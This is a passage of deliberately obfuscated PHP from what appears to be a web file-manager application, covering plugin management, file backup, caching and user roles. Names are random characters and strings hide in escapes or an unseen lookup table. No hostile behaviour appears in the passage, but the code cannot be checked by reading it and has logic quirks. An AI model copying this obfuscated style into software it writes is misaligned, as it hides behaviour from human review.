ÅïÊÙ = array($üÃª¼[1756] => 0, $üÃª¼[566] => $«Ãò±íæ, $üÃª¼[505] => $üÃª¼[2086] . $ø„ÏµÛÚ, $üÃª¼[504] => $êŠúÃ…ç); return $this->where($ ÅïÊÙ)->delete(); } protected function removeByTag($ºş†®Íã, $¤×”–ÜË) { $çÆ‰×ĞÄ =& $_SERVER[³Ôà×Ó]; if (!$this->getByTagID($ºş†®Íã, $¤×”–ÜË)) { return !1; } $Ï¬è‚¿ç = array($çÆ‰×ĞÄ[1756] => 0, $çÆ‰×ĞÄ[566] => $¤×”–ÜË, $çÆ‰×ĞÄ[505] => $çÆ‰×ĞÄ[2086] . $ºş†®Íã); return $this->where($Ï¬è‚¿ç)->delete(); } protected function removeBySource($È–œ©èÕ, $âşñß¼¥) { $ÂĞƒ•ËÖ =& $_SERVER[³Ôà×Ó]; if (!$È–œ©èÕ || !$âşñß¼¥) { return !1; } if (is_array($âşñß¼¥)) { $âşñß¼¥ = array($ÂĞƒ•ËÖ[7], $âşñß¼¥); } $Œ³¤ˆí˜ = array($ÂĞƒ•ËÖ[1756] => 0, $ÂĞƒ•ËÖ[504] => $âşñß¼¥, $ÂĞƒ•ËÖ[566] => array($ÂĞƒ•ËÖ[1089], 0), $ÂĞƒ•ËÖ[505] => $ÂĞƒ•ËÖ[2086] . $È–œ©èÕ); return $this->where($Œ³¤ˆí˜)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\x70\154\165\x67\x69\156\114\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x73\164\141\x74\165\x73", "\162\x65\x67\151\145\x73\164", "\x63\x6f\x6e\x66\x69\147"); public function loadList($û–¿¯ıæ = false) { $‘Î¥’óê = array_to_keyvalue($this->listData(), $_SERVER[³Ôà×Ó][32]); if ($û–¿¯ıæ) { return $‘Î¥’óê[$û–¿¯ıæ]; } return $‘Î¥’óê; } public function init() { $¤¿ßá‹ =& $_SERVER[³Ôà×Ó]; Hook::trigger($¤¿ßá‹[2087]); $™¯ØšÜÀ = $this->loadPluginList(); foreach ($™¯ØšÜÀ as $ø¨âÆÛ« => $‡ËŠºØÑ) { $¸ÜÆ’Æå = $this->appAllow($ø¨âÆÛ«, $‡ËŠºØÑ); if (!$¸ÜÆ’Æå) { continue; } foreach ($‡ËŠºØÑ[$¤¿ßá‹[2088]] as $¡º•°Ñ => $‹Ä‚Ãƒ) { Hook::bind($¡º•°Ñ, $‹Ä‚Ãƒ); } } Hook::trigger($¤¿ßá‹[2089]); Hook::trigger(ACTION); } public function appAllow($ÎĞ¸‰Éó, $Ö ‘„£õ, $õî³Œñ€ = true) { $øï­—× =& $_SERVER[³Ôà×Ó]; $¤åâ†ÖÂ = PLUGIN_DIR . $ÎĞ¸‰Éó . $øï­—×[2090]; if (!is_array($Ö ‘„£õ) || !is_array($Ö ‘„£õ[$øï­—×[2088]]) || $Ö ‘„£õ[$øï­—×[825]] != 1 || !is_file($¤åâ†ÖÂ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$øï­—×[6]][$øï­—×[2091]] || !$GLOBALS[$øï­—×[6]][$øï­—×[2092]]) { return !0; } $ıäûß–ù = explode($øï­—×[50], strtolower($GLOBALS[$øï­—×[6]][$øï­—×[2092]])); return in_array(strtolower($ÎĞ¸‰Éó), $ıäûß–ù) ? !1 : !0; } if ($õî³Œñ€ && !Action($øï­—×[2093])->checkAuth($ÎĞ¸‰Éó)) { return !1; } return !0; } public function unInstall($°úä¸€Ê) { $˜ñ¥õš =& $_SERVER[³Ôà×Ó]; $™ÅŸŸ¨– = $this->loadList($°úä¸€Ê); if (file_exists(PLUGIN_DIR . $°úä¸€Ê)) { Hook::apply($°úä¸€Ê . $˜ñ¥õš[2094]); } $this->remove($™ÅŸŸ¨–[$˜ñ¥õš[484]]); } public function changeStatus($ğ™ÕÜøò, $İ¼ò¼ÓÃ) { $ú—Ìğ¼µ =& $_SERVER[³Ôà×Ó]; $çß€¦¾ø = $this->loadList($ğ™ÕÜøò); if ($İ¼ò¼ÓÃ) { Hook::apply($ğ™ÕÜøò . $ú—Ìğ¼µ[2095]); } $this->update($çß€¦¾ø[$ú—Ìğ¼µ[484]], array($ú—Ìğ¼µ[2096] => $İ¼ò¼ÓÃ)); } public function appRegist($û‹ÓØ•û, $±Ô»ìø) { $‚Ó–µí¬ =& $_SERVER[³Ôà×Ó]; $¼°í²Íá = $this->loadList($û‹ÓØ•û); if ($¼°í²Íá) { $this->update($¼°í²Íá[$‚Ó–µí¬[484]], array($‚Ó–µí¬[2088] => $±Ô»ìø)); } else { $ˆëê¦Ö = array($‚Ó–µí¬[32] => $û‹ÓØ•û, $‚Ó–µí¬[2088] => $±Ô»ìø, $‚Ó–µí¬[825] => 0, $‚Ó–µí¬[6] => $this->getConfigDefault($û‹ÓØ•û)); $this->insert($ˆëê¦Ö); } } public function getConfigDefault($¨é­Úı¶) { $ºü¶¿ŞÁ =& $_SERVER[³Ôà×Ó]; $´Ê„¼ = array(); $ËÖ»•›ì = $this->getPackageJson($¨é­Úı¶); if (!$ËÖ»•›ì && is_array($ËÖ»•›ì[$ºü¶¿ŞÁ[2097]])) { return $´Ê„¼; } foreach ($ËÖ»•›ì[$ºü¶¿ŞÁ[2097]] as $í¡—Øö => $à‹Ç¯ö‘) { if (!isset($à‹Ç¯ö‘[$ºü¶¿ŞÁ[459]]) || isset($´Ê„¼[$í¡—Øö])) { continue; } $´Ê„¼[$í¡—Øö] = $à‹Ç¯ö‘[$ºü¶¿ŞÁ[459]]; } return $´Ê„¼; } public function getPackageJson($ÁŞÅåÅ—) { return Hook::apply($ÁŞÅåÅ— . $_SERVER[³Ôà×Ó][2098]); } public function getConfig($ Ì¿Ö‘Õ, $‰çãèãÏ = false) { $Õ¾ĞïÑ­ =& $_SERVER[³Ôà×Ó]; $âÍ€ÑÙ = array(); $´€÷Ú‘Ï = $this->loadList($ Ì¿Ö‘Õ); if ($´€÷Ú‘Ï && is_array($´€÷Ú‘Ï[$Õ¾ĞïÑ­[6]])) { $âÍ€ÑÙ = $´€÷Ú‘Ï[$Õ¾ĞïÑ­[6]]; } if (!$âÍ€ÑÙ || $‰çãèãÏ) { $âÍ€ÑÙ = $this->getConfigDefault($ Ì¿Ö‘Õ); } return $âÍ€ÑÙ; } public function setConfig($Æ›§°ËØ, $‡Å’¤×œ = false) { $ğ–§æíŒ =& $_SERVER[³Ôà×Ó]; $¹ĞÑ’Ğİ = $this->loadList($Æ›§°ËØ); if (!$¹ĞÑ’Ğİ) { return !1; } $ğÃí™‘ë = $¹ĞÑ’Ğİ[$ğ–§æíŒ[6]]; if ($‡Å’¤×œ == !1) { $ğÃí™‘ë = array(); $‡Å’¤×œ = $this->getConfigDefault($Æ›§°ËØ); } foreach ($‡Å’¤×œ as $“¬©ò² => $ŠØ™ìÇº) { $ğÃí™‘ë[$“¬©ò²] = is_string($ŠØ™ìÇº) ? trim($ŠØ™ìÇº) : $ŠØ™ìÇº; } $this->update($¹ĞÑ’Ğİ[$ğ–§æíŒ[484]], array($ğ–§æíŒ[6] => $ğÃí™‘ë)); } public function viewList() { $Şöô’‹ =& $_SERVER[³Ôà×Ó]; $ÕÏÔÓÖó = $this->loadList(); $this->pluginScan($ÕÏÔÓÖó); $ÕÏÔÓÖó = $this->loadPluginList(); $—±ÜİŒœ = array(); foreach ($ÕÏÔÓÖó as $‚ƒÜ™ƒÄ => $‘Ó‡ÌùÉ) { $Ş„¶¹›¯ = $‘Ó‡ÌùÉ; unset($‘Ó‡ÌùÉ[$Şöô’‹[2088]], $‘Ó‡ÌùÉ[$Şöô’‹[6]]); $ô…°ÇÎµ = PLUGIN_DIR . $‘Ó‡ÌùÉ[$Şöô’‹[32]] . $Şöô’‹[2090]; if (!is_file($ô…°ÇÎµ)) { continue; } $˜Ô£áÊú = Hook::apply($‘Ó‡ÌùÉ[$Şöô’‹[32]] . $Şöô’‹[2098]); if (!is_array($˜Ô£áÊú)) { continue; } $—±ÜİŒœ[$‚ƒÜ™ƒÄ] = array_merge($‘Ó‡ÌùÉ, $˜Ô£áÊú); if ($Ş„¶¹›¯[$Şöô’‹[6]][$Şöô’‹[1679]] != $˜Ô£áÊú[$Şöô’‹[1653]]) { Hook::apply($‘Ó‡ÌùÉ[$Şöô’‹[32]] . $Şöô’‹[2095]); $Ş„¶¹›¯[$Şöô’‹[6]][$Şöô’‹[1679]] = $˜Ô£áÊú[$Şöô’‹[1653]]; $this->update($‘Ó‡ÌùÉ[$Şöô’‹[484]], array($Şöô’‹[6] => $Ş„¶¹›¯[$Şöô’‹[6]])); } } return $—±ÜİŒœ; } private function loadPluginList() { $¹®äñï =& $_SERVER[³Ôà×Ó]; $³ğó¬¾ğ = $this->loadList(); if (strtolower(MOD) == $¹®äñï[2099]) { return $³ğó¬¾ğ; } $‹ŸÑñ¾ç = Hook::trigger($¹®äñï[2100], $³ğó¬¾ğ); if ($³ğó¬¾ğ && !$‹ŸÑñ¾ç) { die; } return $‹ŸÑñ¾ç ? $‹ŸÑñ¾ç : $³ğó¬¾ğ; } private function pluginScan($ñôšı¢‚) { $øßòßç =& $_SERVER[³Ôà×Ó]; recursion_dir(PLUGIN_DIR, $ùÕ»ª‚å, $ıÛÁ—àÅ, 0); foreach ($ùÕ»ª‚å as $×€Ã•è) { $ÍÚƒ£‹× = get_path_this($×€Ã•è); if (isset($ñôšı¢‚[$ÍÚƒ£‹×]) || !file_exists($×€Ã•è . $øßòßç[2101]) || !file_exists($×€Ã•è . $øßòßç[2090])) { continue; } Hook::apply($ÍÚƒ£‹× . $øßòßç[2095]); } } } goto Eùî”ª†ÂÅ; fê×ÖÏ‡Íß: class BackupFile { public function __construct() { } public function index() { $ë¹¼Œˆ« = Backup::get(); $µÛéÌ„ü = $ë¹¼Œˆ«[$_SERVER[³Ôà×Ó][369]][$_SERVER[³Ôà×Ó][230]][$_SERVER[³Ôà×Ó][550]]; $êäó¶ä¦ = array($_SERVER[³Ôà×Ó][551] => array($_SERVER[³Ôà×Ó][882], $µÛéÌ„ü), $_SERVER[³Ôà×Ó][883] => array($_SERVER[³Ôà×Ó][407], $ë¹¼Œˆ«[$_SERVER[³Ôà×Ó][827]])); $‡†ÆÀ« = (int) Model($_SERVER[³Ôà×Ó][864])->where($êäó¶ä¦)->count($_SERVER[³Ôà×Ó][550]); $ÅŞİöÀá = (int) Model($_SERVER[³Ôà×Ó][864])->where($êäó¶ä¦)->sum($_SERVER[³Ôà×Ó][79]); $Ùı§ª = new TaskFileTransfer($_SERVER[³Ôà×Ó][884], $_SERVER[³Ôà×Ó][858], $‡†ÆÀ«, LNG($_SERVER[³Ôà×Ó][859]) . $_SERVER[³Ôà×Ó][860] . LNG($_SERVER[³Ôà×Ó][885])); $Ùı§ª->task[$_SERVER[³Ôà×Ó][838]] = $ÅŞİöÀá; $€Ü¿Šø = array($_SERVER[³Ôà×Ó][886] => $‡†ÆÀ«, $_SERVER[³Ôà×Ó][887] => $ÅŞİöÀá, $_SERVER[³Ôà×Ó][888] => time()); Backup::set($€Ü¿Šø); $’Ñš„à« = !0; $¢Í†ãÃä = $this->storeIds(); $”ÕÅ—îµ = 1; $‘èÉªä¨ = 1000; $í€Ğ÷Äƒ = $Ñ„‹ ‹Š = 0; $Üºá–ø = array(); $šĞ×ê²Æ = $’öš·Úë = 0; do { $¯Áä§ñ = $_SERVER[³Ôà×Ó][889]; $Ë£ÅòÎè = Model($_SERVER[³Ôà×Ó][864])->where($êäó¶ä¦)->field($¯Áä§ñ)->order($_SERVER[³Ôà×Ó][890])->selectPage($‘èÉªä¨, $”ÕÅ—îµ); $òš­•Ûğ = !empty($Ë£ÅòÎè[$_SERVER[³Ôà×Ó][454]]) ? $Ë£ÅòÎè[$_SERVER[³Ôà×Ó][454]] : array(); foreach ($òš­•Ûğ as $¢œ­İÀ) { if (!$this->_fileExist($¢œ­İÀ, $Üºá–ø, $¢Í†ãÃä)) { write_log("\x66\x69\x6c\145\40\x6e\157\164\40\x65\170\151\x73\164\x2e\x66\151\x6c\145\111\x44\x3a{$¢œ­İÀ[$_SERVER[³Ôà×Ó][550]]}\54\x20\160\141\164\150\x3a{$¢œ­İÀ[$_SERVER[³Ôà×Ó][87]]}", $_SERVER[³Ôà×Ó][891]); continue; } $şÉºíÜí = $¢œ­İÀ[$_SERVER[³Ôà×Ó][87]]; $Æ”œŠ­µ = "\173\x69\157\72{$ë¹¼Œˆ«[$_SERVER[³Ôà×Ó][827]]}\x7d" . substr($şÉºíÜí, strlen("\x7b\151\x6f\x3a{$¢œ­İÀ[$_SERVER[³Ôà×Ó][892]]}\x7d")); if (IO::exist($Æ”œŠ­µ)) { $Ùı§ª->updateFileEnd($¢œ­İÀ[$_SERVER[³Ôà×Ó][32]], $¢œ­İÀ[$_SERVER[³Ôà×Ó][79]]); } else { $Æ”œŠ­µ = get_path_father($Æ”œŠ­µ); IO::mkdir($Æ”œŠ­µ); if (!IO::copy($şÉºíÜí, $Æ”œŠ­µ, $_SERVER[³Ôà×Ó][893])) { write_log($_SERVER[³Ôà×Ó][894] . $şÉºíÜí . $_SERVER[³Ôà×Ó][878] . $Æ”œŠ­µ . $_SERVER[³Ôà×Ó][178], $_SERVER[³Ôà×Ó][858]); $’Ñš„à« = !1; break; } } $µÛéÌ„ü = $¢œ­İÀ[$_SERVER[³Ôà×Ó][550]]; $Ñ„‹ ‹Š += 1; $í€Ğ÷Äƒ += $¢œ­İÀ[$_SERVER[³Ôà×Ó][79]]; $’öš·Úë += 1; $šĞ×ê²Æ += $¢œ­İÀ[$_SERVER[³Ôà×Ó][79]]; if ($í€Ğ÷Äƒ >= 1024 * 1024 * 100) { $€Ü¿Šø = array($_SERVER[³Ôà×Ó][826] => $µÛéÌ„ü, $_SERVER[³Ôà×Ó][895] => $’öš·Úë, $_SERVER[³Ôà×Ó][896] => $šĞ×ê²Æ); Backup::set($€Ü¿Šø); $í€Ğ÷Äƒ = $Ñ„‹ ‹Š = 0; } } $ßæÊ¶ = count($òš­•Ûğ); $”ÕÅ—îµ++; } while ($ßæÊ¶ == $‘èÉªä¨); $Ùı§ª->end(); $€Ü¿Šø = array($_SERVER[³Ôà×Ó][897] => 1, $_SERVER[³Ôà×Ó][836] => time(), $_SERVER[³Ôà×Ó][850] => 1, $_SERVER[³Ôà×Ó][826] => $µÛéÌ„ü, $_SERVER[³Ôà×Ó][898] => time()); if ($Ñ„‹ ‹Š) { $€Ü¿Šø[$_SERVER[³Ôà×Ó][895]] = $’öš·Úë; $€Ü¿Šø[$_SERVER[³Ôà×Ó][896]] = $šĞ×ê²Æ; } Backup::set($€Ü¿Šø); return !0; } private function _fileExist($Ğç¯ı§›, &$¬À¯ÆÌÂ, $’“‰Şœ) { $­×ñø«Ê =& $_SERVER[³Ôà×Ó]; $šª¬±øö = $Ğç¯ı§›[$­×ñø«Ê[87]]; if (in_array($Ğç¯ı§›[$­×ñø«Ê[550]], $¬À¯ÆÌÂ)) { return !1; } if (!in_array($Ğç¯ı§›[$­×ñø«Ê[892]], $’“‰Şœ)) { return !1; } if (IO::exist($šª¬±øö)) { return !0; } $¥üá¡¹  = get_path_father($šª¬±øö); if (IO::exist($¥üá¡¹ )) { $¬À¯ÆÌÂ[] = $Ğç¯ı§›[$­×ñø«Ê[550]]; return !1; } $»Îñèåü = array($­×ñø«Ê[892] => $Ğç¯ı§›[$­×ñø«Ê[892]], $­×ñø«Ê[87] => array($­×ñø«Ê[468], "{$¥üá¡¹ }\x25")); $Ù·ã˜Á = Model($­×ñø«Ê[864])->where($»Îñèåü)->field($­×ñø«Ê[551])->select(); $¬À¯ÆÌÂ = array_merge($¬À¯ÆÌÂ, array_to_keyvalue($Ù·ã˜Á, $­×ñø«Ê[12], $­×ñø«Ê[550])); return !1; } private function _fileFilter($Âá¯ØºŠ) { $É¿¤ğÌ¢ =& $_SERVER[³Ôà×Ó]; return; if (empty($Âá¯ØºŠ)) { return; } $î¨óÑ˜ı = array($É¿¤ğÌ¢[550] => array($É¿¤ğÌ¢[7], array_unique($Âá¯ØºŠ))); $…Ãşµõ = Model($É¿¤ğÌ¢[899])->where($î¨óÑ˜ı)->field($É¿¤ğÌ¢[193])->select(); foreach ($…Ãşµõ as $¹®ÎÜû) { Model($É¿¤ğÌ¢[899])->remove($¹®ÎÜû[$É¿¤ğÌ¢[193]], !1); } } private function storeIds() { $Š £ö†© =& $_SERVER[³Ôà×Ó]; $Æïˆ±… = Model($Š £ö†©[842])->listData(); $øİú†Ú³ = array(); $ÃšÂ¼æ¦ = $GLOBALS[$Š £ö†©[6]][$Š £ö†©[92]][$Š £ö†©[900]]; foreach ($Æïˆ±… as $ª¬Å§Âø) { $Î²Ñ¶¡² = strtolower($ª¬Å§Âø[$Š £ö†©[98]]); if (!isset($ÃšÂ¼æ¦[$Î²Ñ¶¡²])) { continue; } $ÇÑ»Ğ¶ù = $Š £ö†©[77] . (isset($ÃšÂ¼æ¦[$Î²Ñ¶¡²]) ? $ÃšÂ¼æ¦[$Î²Ñ¶¡²] : ucfirst($Î²Ñ¶¡²)); if (!class_exists($ÇÑ»Ğ¶ù)) { continue; } $øİú†Ú³[] = $ª¬Å§Âø[$Š £ö†©[484]]; } return $øİú†Ú³; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ú–İÉöĞ =& $_SERVER[³Ôà×Ó]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Ò’¸¸É” = $GLOBALS[$ú–İÉöĞ[6]][$ú–İÉöĞ[425]]; $¬º “®¢ = $Ò’¸¸É”[$Ò’¸¸É”[$ú–İÉöĞ[901]]]; $€—ÒÛÍ = $Ò’¸¸É”[$ú–İÉöĞ[902]]; switch ($Ò’¸¸É”[$ú–İÉöĞ[901]]) { case $ú–İÉöĞ[21]: self::$handle = Model($ú–İÉöĞ[903]); break; case $ú–İÉöĞ[904]: self::$handle = new CacheRedis($¬º “®¢, $€—ÒÛÍ); break; case $ú–İÉöĞ[905]: self::$handle = new CacheMemcached($¬º “®¢, $€—ÒÛÍ); break; case $ú–İÉöĞ[230]: self::$handle = new CacheFile($¬º “®¢, $€—ÒÛÍ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($òİ³¾à·) { if (is_array($òİ³¾à·) || is_object($òİ³¾à·)) { $òİ³¾à· = json_encode($òİ³¾à·); } $òİ³¾à· = rawurlencode($òİ³¾à·); return md5(KOD_SITE_ID . $_SERVER[³Ôà×Ó][11] . $òİ³¾à·); } public static function get($Õ²Ğ”¾, $ÔÒÎÀ¡€ = false) { $±ÏÛ•ƒ = self::key($Õ²Ğ”¾); $éŞåÁ¢õ = self::init(); if ($ÔÒÎÀ¡€) { return unserialize($éŞåÁ¢õ->get($±ÏÛ•ƒ)); } if (!isset(self::$memoryCache[$±ÏÛ•ƒ])) { $Ãôô˜Ä¨ = $éŞåÁ¢õ->get($±ÏÛ•ƒ); self::$memoryCache[$±ÏÛ•ƒ] = unserialize($Ãôô˜Ä¨); } return self::$memoryCache[$±ÏÛ•ƒ]; } public static function set($¬±ÛÆŒõ, $Û¹…£ø, $İ‰»ô¤¦ = false) { $œÖÊ¾Ä =& $_SERVER[³Ôà×Ó]; $ó¡ÀÏ = self::key($¬±ÛÆŒõ); if (isset(self::$memoryCache[$ó¡ÀÏ]) && self::$memoryCache[$ó¡ÀÏ] === $Û¹…£ø) { return !0; } if ($İ‰»ô¤¦ === 0) { self::$memoryCache[$ó¡ÀÏ] = $Û¹…£ø; return !0; } $Ú›£ôšî = self::init(); $Ú…ÄÖ¢Û = serialize($Û¹…£ø); CacheLock::lock($¬±ÛÆŒõ . $œÖÊ¾Ä[906]); $İ„íì™ş = $Ú›£ôšî->set($ó¡ÀÏ, $Ú…ÄÖ¢Û, $İ‰»ô¤¦); self::$memoryCache[$ó¡ÀÏ] = $Û¹…£ø; CacheLock::unlock($¬±ÛÆŒõ . $œÖÊ¾Ä[906]); return $İ„íì™ş; } public static function getCall($”ÉÛ›€ƒ, $úºéÀúí, $×¼™²Èß, $·ŒÉ˜Ç = array()) { $ şà®ƒö =& $_SERVER[³Ôà×Ó]; $œÙñë™Ü = self::get($”ÉÛ›€ƒ); if ($œÙñë™Ü || $œÙñë™Ü === $ şà®ƒö[12]) { return $œÙñë™Ü; } $œÙñë™Ü = call_user_func_array($×¼™²Èß, $·ŒÉ˜Ç); $œÙñë™Ü = $œÙñë™Ü ? $œÙñë™Ü : $ şà®ƒö[12]; self::set($”ÉÛ›€ƒ, $œÙñë™Ü, $úºéÀúí); return $œÙñë™Ü; } public static function remove($çöº¿¥ç) { $—ú¡–½… = self::key($çöº¿¥ç); unset(self::$memoryCache[$—ú¡–½…]); self::clearTimeout(); CacheLock::lock($çöº¿¥ç); $‹Ü¶í´ = self::init()->remove($—ú¡–½…); CacheLock::unlock($çöº¿¥ç); return $‹Ü¶í´; } public static function removeMemory($»ÖÓ”œØ) { $İÈ©´Æ± = self::key($»ÖÓ”œØ); unset(self::$memoryCache[$İÈ©´Æ±]); } public static function clearMemory($«§¶êĞº = false) { if ($«§¶êĞº) { $«§¶êĞº = self::key($«§¶êĞº); unset(self::$memoryCache[$«§¶êĞº]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[³Ôà×Ó][907])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[³Ôà×Ó][908])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Î·­íŒ, $ñĞ»ÃÑ¥) { $’ÅÀÉß€ =& $_SERVER[³Ôà×Ó]; $this->cachePath = $Î·­íŒ[$’ÅÀÉß€[87]]; $this->prefix = $’ÅÀÉß€[909]; $this->cacheTime = $ñĞ»ÃÑ¥; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ò²Áµ¸¼) { $ŸˆÒ¡«Ö =& $_SERVER[³Ôà×Ó]; $ò²Áµ¸¼ = str_replace(array($ŸˆÒ¡«Ö[910], $ŸˆÒ¡«Ö[100], $ŸˆÒ¡«Ö[76]), $ŸˆÒ¡«Ö[911], $ò²Áµ¸¼); return $this->cachePath . $ŸˆÒ¡«Ö[912] . $ò²Áµ¸¼ . $ŸˆÒ¡«Ö[913]; } public function set($¼üñûÉÑ, $÷ğ¤Ñ•Ö, $œÅÎ•› = false) { $œÅÎ•› = $œÅÎ•› ? $œÅÎ•› : $this->cacheTime; $ù†Ğ­æ§ = $this->getFile($¼üñûÉÑ); if (file_put_contents($ù†Ğ­æ§, $this->prefix . $÷ğ¤Ñ•Ö, LOCK_EX)) { @touch($ù†Ğ­æ§, intval(time() + $œÅÎ•›)); clearstatcache(); return !0; } @unlink($ù†Ğ­æ§); return !1; } public function get($±é¤Øê¾) { $ß¤òÈ¢ô = $this->getFile($±é¤Øê¾); if (file_exists($ß¤òÈ¢ô) && filemtime($ß¤òÈ¢ô) < time()) { @unlink($ß¤òÈ¢ô); return !1; } $«¿³¬è = @file_get_contents($ß¤òÈ¢ô); return substr($«¿³¬è, strlen($this->prefix)); } public function remove($€‡şì¾­) { $“ÄáìÖ­ = $this->getFile($€‡şì¾­); return @unlink($“ÄáìÖ­); } public function deleteAll() { $”Ï…é½í =& $_SERVER[³Ôà×Ó]; $³¶§º¸’ = scandir($this->cachePath); foreach ($³¶§º¸’ as $³¨¥¿‹Ó) { $ğ’äİçé = $this->cachePath . $³¨¥¿‹Ó; if (strpos($ğ’äİçé, $”Ï…é½í[913]) && strpos($ğ’äİçé, $”Ï…é½í[914])) { @unlink($ğ’äİçé); } } } public function clearTimeout() { $ï€äÛ‡ù =& $_SERVER[³Ôà×Ó]; $ÌÚê¼ = scandir($this->cachePath); foreach ($ÌÚê¼ as $—öİÈìµ) { $–æÈ›° = $this->cachePath . $—öİÈìµ; if (strpos($–æÈ›°, $ï€äÛ‡ù[913]) && strpos($–æÈ›°, $ï€äÛ‡ù[914]) && filemtime($–æÈ›°) < time()) { @unlink($–æÈ›°); } } } } goto eÎ™‚Şñ¡; B„¯ÙÂ²º: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\x72\157\154\x65\x4c\151\x73\164"; public $field = array("\x6e\x61\155\145", "\x61\x75\164\x68", "\x6c\141\x62\x65\154", "\144\151\x73\160\154\141\171", "\163\x79\163\164\x65\155", "\144\145\x73\x63", "\x69\147\156\157\162\x65\x45\x78\164", "\x69\147\x6e\157\x72\145\106\151\x6c\x65\x53\151\172\x65", "\141\144\x6d\151\x6e\x69\x73\164\162\141\x74\157\162", "\163\x6f\x72\x74"); public function listData($çÀÓ§†é = false, $ÙÒÛ‰öù = "\163\157\162\x74", $Ëí–œí = false) { $î«°¾çã =& $_SERVER[³Ôà×Ó]; $›ª¯»© = parent::listData($çÀÓ§†é, $ÙÒÛ‰öù, $Ëí–œí); if (!$çÀÓ§†é) { foreach ($›ª¯»© as $íŠ¨‰…  => $¿ë˜æé) { if ($¿ë˜æé[$î«°¾çã[2170]] == 1) { $›ª¯»©[$íŠ¨‰… ][$î«°¾çã[535]] = LNG($î«°¾çã[2431]); } } } return $›ª¯»©; } public function update($è¾«á½ß, $öÖê‰”) { $Ô¶ËİÍ =& $_SERVER[³Ôà×Ó]; $áØ¹µ¸¶ = parent::listData($è¾«á½ß); $ĞÑ½¤İ  = $this->findByName($öÖê‰”[$Ô¶ËİÍ[32]]); if (!$áØ¹µ¸¶ || $ĞÑ½¤İ  && $ĞÑ½¤İ [$Ô¶ËİÍ[484]] != $áØ¹µ¸¶[$Ô¶ËİÍ[484]]) { return !1; } if ($ĞÑ½¤İ [$Ô¶ËİÍ[2170]] == 1) { $öÖê‰” = array($Ô¶ËİÍ[32] => $öÖê‰”[$Ô¶ËİÍ[32]], $Ô¶ËİÍ[1986] => $öÖê‰”[$Ô¶ËİÍ[1986]]); } $this->filterAuth($öÖê‰”[$Ô¶ËİÍ[496]]); return parent::update($è¾«á½ß, $öÖê‰”); } public function remove($¨Á² Á) { $šÁÆæì = parent::listData($¨Á² Á); if (!$šÁÆæì || $šÁÆæì[$_SERVER[³Ôà×Ó][191]]) { return !1; } return parent::remove($¨Á² Á); } public function add($Â›ç°šå) { $Ëì¬õ®« =& $_SERVER[³Ôà×Ó]; $ôÈç‡† = $Â›ç°šå[$Ëì¬õ®«[32]]; if ($this->findByName($ôÈç‡†)) { return !1; } $€ä‹©Ü = array($Ëì¬õ®«[503] => $ôÈç‡†, $Ëì¬õ®«[1969] => $Ëì¬õ®«[12], $Ëì¬õ®«[1965] => $Ëì¬õ®«[1973], $Ëì¬õ®«[2432] => 1, $Ëì¬õ®«[1968] => 0, $Ëì¬õ®«[2433] => 0, $Ëì¬õ®«[1967] => $this->getSort()); $Â›ç°šå = array_merge($€ä‹©Ü, $Â›ç°šå); $this->filterAuth($Â›ç°šå[$Ëì¬õ®«[496]]); return parent::insert($Â›ç°šå); } private function getSort() { $Ôá÷÷êˆ =& $_SERVER[³Ôà×Ó]; $í“‘Æ¦Ÿ = parent::listData(); $û÷°•å¥ = array_to_keyvalue($í“‘Æ¦Ÿ, $Ôá÷÷êˆ[12], $Ôá÷÷êˆ[1987]); return empty($û÷°•å¥) ? 0 : max($û÷°•å¥) + 1; } private function filterAuth(&$†¿½Ÿ‹Ò) { $Ÿ€õ‹· =& $_SERVER[³Ôà×Ó]; $Õùùôİè = array(); $Ì²¢è½» = array_filter(explode($Ÿ€õ‹·[50], $†¿½Ÿ‹Ò)); foreach ($Ì²¢è½» as $†¿½Ÿ‹Ò) { $ä¤´¥¨ = explode($Ÿ€õ‹·[10], $†¿½Ÿ‹Ò); if ($ä¤´¥¨[0] == $Ÿ€õ‹·[2434] && $ä¤´¥¨[1] != $Ÿ€õ‹·[1272]) { $³³ëÌíş = $ä¤´¥¨[0] . $Ÿ€õ‹·[10] . $ä¤´¥¨[1] . $Ÿ€õ‹·[2435]; if (!in_array($³³ëÌíş, $Ì²¢è½»)) { $Õùùôİè[] = $³³ëÌíş; } } $Õùùôİè[] = $†¿½Ÿ‹Ò; } $†¿½Ÿ‹Ò = implode($Ÿ€õ‹·[50], $Õùùôİè); } public function findRoleDefault() { $ÂÏ›Ó¢ =& $_SERVER[³Ôà×Ó]; $ÕÓÉµ¼­ = parent::listData(); $¾êä÷² = !1; foreach ($ÕÓÉµ¼­ as $­–¶™ó™) { if (!$­–¶™ó™ || $­–¶™ó™[$ÂÏ›Ó¢[1985]] == $ÂÏ›Ó¢[228] || $­–¶™ó™[$ÂÏ›Ó¢[2170]] == 1) { continue; } if (strstr($­–¶™ó™[$ÂÏ›Ó¢[496]], $ÂÏ›Ó¢[2436])) { continue; } if (!strstr($­–¶™ó™[$ÂÏ›Ó¢[496]], $ÂÏ›Ó¢[2437])) { continue; } if (!$¾êä÷²) { $¾êä÷² = $­–¶™ó™; continue; } $ëùò½³ç = explode($ÂÏ›Ó¢[50], $¾êä÷²[$ÂÏ›Ó¢[496]]); $‚¿¬„îÒ = explode($ÂÏ›Ó¢[50], $­–¶™ó™[$ÂÏ›Ó¢[496]]); if (count($ëùò½³ç) > count($‚¿¬„îÒ)) { $¾êä÷² = $­–¶™ó™; } } return $¾êä÷² ? $¾êä÷²[$ÂÏ›Ó¢[484]] : $ÂÏ›Ó¢[12]; } public function sort($Ëßğ‚Ü—, $ˆÀ‡ë—×) { return parent::update($Ëßğ‚Ü—, $ˆÀ‡ë—×); } } class SystemTaskModel extends ModelBaseLight { public $optionType = 